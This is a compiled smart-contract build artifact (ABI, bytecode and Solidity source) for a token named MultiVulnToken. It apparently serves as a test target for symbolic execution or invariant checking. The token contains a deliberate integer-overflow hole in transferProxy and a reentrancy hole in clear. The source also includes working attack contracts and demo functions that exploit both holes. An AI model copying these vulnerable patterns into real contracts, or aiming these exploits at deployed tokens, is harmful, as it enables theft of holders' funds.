{
  "contractName": "MultiVulnToken",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "initialSupply",
          "type": "uint256"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_owner",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_value",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_fee",
          "type": "uint256"
        }
      ],
      "name": "transferProxy",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_to",
          "type": "address"
        }
      ],
      "name": "clear",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610938380380610938833981810160405281019061003291906100c0565b80600181905550600154600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550506100ed565b600080fd5b6000819050919050565b61009d8161008a565b81146100a857600080fd5b50565b6000815190506100ba81610094565b92915050565b6000602082840312156100d6576100d5610085565b5b60006100e4848285016100ab565b91505092915050565b61083c806100fc6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806318160ddd1461005c5780633d0a40611461007a57806370a08231146100965780638da5cb5b146100c6578063cf053d9d146100e4575b600080fd5b610064610114565b60405161007191906105e0565b60405180910390f35b610094600480360381019061008f919061065e565b61011a565b005b6100b060048036038101906100ab919061065e565b6102fb565b6040516100bd91906105e0565b60405180910390f35b6100ce610344565b6040516100db919061069a565b60405180910390f35b6100fe60048036038101906100f991906106e1565b610368565b60405161010b9190610763565b60405180910390f35b60015481565b6000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905080600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555060003373ffffffffffffffffffffffffffffffffffffffff16826040516024016101d591906105e0565b6040516020818303038152906040527f85892c24000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161025f91906107ef565b6000604051808303816000865af19150503d806000811461029c576040519150601f19603f3d011682016040523d82523d6000602084013e6102a1565b606091505b505080915050806102b157600080fd5b6000600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550505050565b6000600260008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000828201600260008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410156103b857600080fd5b600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205483600260008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205401101561044557600080fd5b600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205482600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020540110156104d257600080fd5b82600260008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555081600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550818301600260008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555060019050949350505050565b6000819050919050565b6105da816105c7565b82525050565b60006020820190506105f560008301846105d1565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061062b82610600565b9050919050565b61063b81610620565b811461064657600080fd5b50565b60008135905061065881610632565b92915050565b600060208284031215610674576106736105fb565b5b600061068284828501610649565b91505092915050565b61069481610620565b82525050565b60006020820190506106af600083018461068b565b92915050565b6106be816105c7565b81146106c957600080fd5b50565b6000813590506106db816106b5565b92915050565b600080600080608085870312156106fb576106fa6105fb565b5b600061070987828801610649565b945050602061071a87828801610649565b935050604061072b878288016106cc565b925050606061073c878288016106cc565b91505092959194509250565b60008115159050919050565b61075d81610748565b82525050565b60006020820190506107786000830184610754565b92915050565b600081519050919050565b600081905092915050565b60005b838110156107b2578082015181840152602081019050610797565b60008484015250505050565b60006107c98261077e565b6107d38185610789565b93506107e3818560208601610794565b80840191505092915050565b60006107fb82846107be565b91508190509291505056fea26469706673582212209124aab2fde1660d14d714ff53c77edc6619d51419436f80d4100af4def0ec5264736f6c63430008120033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\n\n/* Vulnerability examples:\n\n   reentrancy:\n   https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/\n\n   integer overflow:\n   https://peckshield.medium.com/integer-overflow-i-e-proxyoverflow-bug-found-in-multiple-erc20-smart-contracts-14fecfba2759\n*/\npragma solidity >=0.8.0;\n\nabstract contract Token {\n    address public owner;\n    uint256 public totalSupply;\n\n    function balanceOf(\n        address _owner\n    ) public view virtual returns (uint256 balance);\n}\n\n/// @custom:tct invariant: forall x:address :: 0 <= balances[x] && balances[x] <= totalSupply\n/// @custom:tct invariant: sum(balances) == totalSupply\nabstract contract StandardToken is Token {\n    function balanceOf(\n        address _owner\n    ) public view override returns (uint256 balance) {\n        return balances[_owner];\n    }\n\n    mapping(address => uint256) balances;\n}\n\ncontract MultiVulnToken is StandardToken {\n    constructor(uint256 initialSupply) {\n        totalSupply = initialSupply;\n        balances[msg.sender] = totalSupply;\n    }\n\n    function transferProxy(\n        address _from,\n        address _to,\n        uint256 _value,\n        uint256 _fee\n    ) public returns (bool) {\n        unchecked {\n            require(balances[_from] >= _fee + _value);\n            require(balances[_to] + _value >= balances[_to]);\n            require(balances[msg.sender] + _fee >= balances[msg.sender]);\n\n            balances[_to] += _value;\n            balances[msg.sender] += _fee;\n            balances[_from] -= _value + _fee;\n            return true;\n        }\n    }\n\n    //This function moves all tokens of msg.sender to the account of \"_to\"\n    function clear(address _to) public {\n        unchecked {\n            uint256 bal = balances[msg.sender];\n            balances[_to] += bal;\n            bool success;\n            (success, ) = msg.sender.call(\n                abi.encodeWithSignature(\"receiveNotification(uint256)\", bal)\n            );\n            require(success);\n            balances[msg.sender] = 0;\n        }\n    }\n}\n\n//========================================================\ncontract reentrancy_attack {\n    MultiVulnToken public multiVulnToken;\n    address _to;\n    uint count = 0;\n    constructor(address _multiVulnTokenAddress, address __to) {\n        multiVulnToken = MultiVulnToken(_multiVulnTokenAddress);\n        _to = __to;\n    }\n    function receiveNotification(uint256) public {\n        unchecked {\t\n\t\t    if (count < 1) {\n\t\t        count++;\n\t\t        multiVulnToken.clear(_to);\n\t\t    }\n\t\t}\n    }\n    function attack() public {\n        multiVulnToken.clear(_to);\n    }\n}\ncontract no_reentrancy_attack {\n    MultiVulnToken public multiVulnToken;\n    address _to;\n    constructor(address _multiVulnTokenAddress, address __to) {\n        multiVulnToken = MultiVulnToken(_multiVulnTokenAddress);\n        _to = __to;\n    }\n    function receiveNotification(uint256) public {\n        //nothing special\n    }\n    function call_clear() public {\n        multiVulnToken.clear(_to);\n    }\n}\n\ncontract Demo {\n    MultiVulnToken MultiVulnTokenContractAddress;\n\n    address attacker1Address =\n        address(0x92349Ef835BA7Ea6590C3947Db6A11EeE1a90cFd); //just an arbitrary address\n    reentrancy_attack attacker2Address1;\n    address attacker2Address2 =\n        address(0x0Ce8dAf9acbA5111C12B38420f848396eD71Cb3E); //just an arbitrary address\n    no_reentrancy_attack benignUserAddress1;\n    address benignUserAddress2 =\n        address(0x71C7656EC7ab88b098defB751B7401B5f6d8976F); //just an arbitrary address\n\n    constructor() {\n        MultiVulnTokenContractAddress = new MultiVulnToken(1000);\n        attacker2Address1 = new reentrancy_attack(address(MultiVulnTokenContractAddress),attacker2Address2);\n        benignUserAddress1 = new no_reentrancy_attack(address(MultiVulnTokenContractAddress),benignUserAddress2);\n\n        //suppose attacker2Address1 has 5 tokens initially\n        MultiVulnTokenContractAddress.transferProxy(\n            address(this),\n            address(attacker2Address1),\n            5,\n            0\n        );\n\n        //suppose benignUserAddress has 5 tokens too\n        MultiVulnTokenContractAddress.transferProxy(\n            address(this),\n            address(benignUserAddress1),\n            5,\n            0\n        );\n    }\n\n    function getBalanceOfAttacker1() public view returns (uint256) {\n        return MultiVulnTokenContractAddress.balanceOf(attacker1Address);\n    }\n\n    function attack1_int_overflow() public {\n        MultiVulnTokenContractAddress.transferProxy(\n            address(this),\n            attacker1Address,\n            uint256(2 ** 255 + 1),\n            uint256(2 ** 255)\n        );\n    }\n\n    function getBalanceOfAttacker2() public view returns (uint256) {\n        return\n            MultiVulnTokenContractAddress.balanceOf(\n                address(attacker2Address1)\n            ) + MultiVulnTokenContractAddress.balanceOf(attacker2Address2);\n    }\n\n    function attack2_reentrancy() public {\n        attacker2Address1.attack();\n    }\n\n    function getBenignUserBal() public view returns (uint256) {\n        return\n            MultiVulnTokenContractAddress.balanceOf(\n                address(benignUserAddress1)\n            ) +\n            MultiVulnTokenContractAddress.balanceOf(\n                address(benignUserAddress2)\n            );\n    }\n\n    function no_reentrancy() public {\n        benignUserAddress1.call_clear();\n    }\n}\n",
  "sourcePath": "/Users/ashle/Desktop/demo/trace-symexec/MultiVulnToken.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.18+commit.87f61d96.Emscripten.clang"
  },
  "schemaVersion": "3.4.14",
  "updatedAt": "2023-06-29T18:17:32.777Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}